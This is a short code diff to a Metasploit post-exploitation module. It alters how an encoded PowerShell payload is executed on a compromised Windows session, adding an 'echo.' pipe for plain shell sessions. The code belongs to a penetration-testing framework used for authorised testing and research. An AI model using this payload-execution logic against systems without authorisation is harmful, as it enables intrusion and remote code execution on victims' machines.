@@ -174,10 +174,12 @@ class MetasploitModule < Msf::Post
       elsif have_powershell? && (datastore['WIN_TRANSFER'] != 'VBS')
         vprint_status('Transfer method: Powershell')
         psh_opts = { persist: false, prepend_sleep: 1 }
-        unless session.type == 'shell'
+        if session.type == 'shell'
+          cmd_exec("echo. | #{cmd_psh_payload(payload_data, psh_arch, psh_opts)}")
+        else
           psh_opts[:remove_comspec] = true
+          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
         end
-        cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
       else
         print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
         vprint_status('Transfer method: VBS [fallback]')
